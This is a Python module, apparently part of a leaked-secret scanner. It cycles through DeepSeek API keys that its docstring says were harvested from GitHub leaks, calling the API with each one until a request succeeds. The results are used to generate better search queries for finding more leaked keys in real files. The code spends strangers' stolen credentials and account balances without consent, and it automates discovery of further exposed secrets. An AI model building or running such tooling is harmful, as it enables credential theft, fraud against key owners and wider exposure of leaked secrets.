"""
DeepSeek API client with automatic key rotation.

Pulls valid DeepSeek keys from the scanner's own DB (we already harvest them
from GitHub leaks). On 401/402/insufficient_quota → marks the key dead via
db.update_key_validity and tries the next one. If every key fails → returns
None and the caller (vocab_expander) skips the cycle gracefully.

Model: deepseek-v4-pro — 1M context window, OpenAI-compatible
ChatCompletions endpoint at https://api.deepseek.com/v1/chat/completions.

Used by vocab_expander.py to extract new env-var-name/filename conventions
from real valid-key file contents. NOT used by the scanner itself.
"""

import logging
from typing import Any

import httpx

import db

log = logging.getLogger(__name__)


_BASE_URL = "https://api.deepseek.com/v1/chat/completions"
_DEFAULT_MODEL = "deepseek-v4-pro"
_FALLBACK_MODEL = "deepseek-chat"

# Status codes that mean "this key is dead, rotate":
#   401 — invalid token
#   402 — insufficient balance (validate_deepseek already gates on this, but
#         keys may exhaust between scans)
_DEAD_STATUS = (401, 402)

# Status codes that mean "this key is alive but throttled, try next":
_RATE_LIMIT_STATUS = (429,)


async def call_deepseek(
    messages: list[dict],
    model: str = _DEFAULT_MODEL,
    response_format: dict | None = None,
    reasoning_effort: str = "max",
    timeout: float = 900.0,
) -> dict | None:
    """
    Call DeepSeek chat completions with automatic key rotation.

    Returns the full response JSON on success, None if every key failed.

    Defaults are tuned for v4-pro:
      reasoning_effort="max" — full reasoning budget (model thinks 5-15K
        tokens before emitting content, takes 3-5 min for creative tasks).
        Locally verified — produces JUICY queries (multi-provider OR combos,
        Chinese geo-tokens, niche files, 2026 model names).
      No max_tokens — let server use ceiling (1M context). Bounded by
        timeout=900s instead.
      No temperature/top_p/penalty — thinking-mode REJECTS these per docs.

    `response_format={"type": "json_object"}` enables strict JSON-mode.
    """
    keys = db.get_valid_keys_by_provider("deepseek")
    if not keys:
        log.warning("DeepSeek call: no valid keys in DB — skipping")
        return None

    payload: dict[str, Any] = {
        "model":    model,
        "messages": messages,
    }
    if reasoning_effort:
        payload["reasoning_effort"] = reasoning_effort
    if response_format:
        payload["response_format"] = response_format

    fallback_attempted = False

    async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as c:
        for row in keys:
            key  = row["key_full"]
            khash = row["key_hash"]
            preview = key[:14] + "..."
            try:
                r = await c.post(
                    _BASE_URL,
                    headers={
                        "Authorization": f"Bearer {key}",
                        "Content-Type":  "application/json",
                    },
                    json=payload,
                )
            except (httpx.TimeoutException, httpx.NetworkError) as e:
                log.warning("DeepSeek %s: network err %s — trying next key",
                            preview, type(e).__name__)
                continue

            if r.status_code in _DEAD_STATUS:
                db.update_key_validity(khash, False)
                log.warning("DeepSeek %s: %d (dead) — marking invalid + rotating",
                            preview, r.status_code)
                continue

            if r.status_code in _RATE_LIMIT_STATUS:
                log.warning("DeepSeek %s: 429 throttled — trying next key", preview)
                continue

            if r.status_code == 400 and not fallback_attempted:
                # 400 may indicate model name unknown for THIS account tier.
                # Retry once on the same key with the fallback model before
                # rotating — saves a key from being prematurely abandoned.
                body_lower = (r.text or "").lower()
                if ("model" in body_lower and
                    ("not found" in body_lower or "invalid" in body_lower)):
                    log.warning("DeepSeek %s: model %s rejected -> fallback to %s",
                                preview, model, _FALLBACK_MODEL)
                    payload["model"] = _FALLBACK_MODEL
                    # deepseek-chat doesn't accept reasoning_effort
                    payload.pop("reasoning_effort", None)
                    fallback_attempted = True
                    try:
                        r = await c.post(
                            _BASE_URL,
                            headers={
                                "Authorization": f"Bearer {key}",
                                "Content-Type":  "application/json",
                            },
                            json=payload,
                        )
                    except Exception as e:
                        log.warning("DeepSeek %s: fallback retry err: %s", preview, e)
                        continue

            if r.status_code != 200:
                log.warning("DeepSeek %s: HTTP %d — %s",
                            preview, r.status_code, (r.text or "")[:200])
                continue

            try:
                return r.json()
            except Exception as e:
                log.warning("DeepSeek %s: json decode err: %s", preview, e)
                continue

    log.error("DeepSeek call: all %d keys exhausted", len(keys))
    return None


def extract_text(response: dict | None) -> str | None:
    """Pull the assistant message content out of a chat completion response."""
    if not response:
        return None
    try:
        return response["choices"][0]["message"]["content"]
    except (KeyError, IndexError, TypeError):
        return None
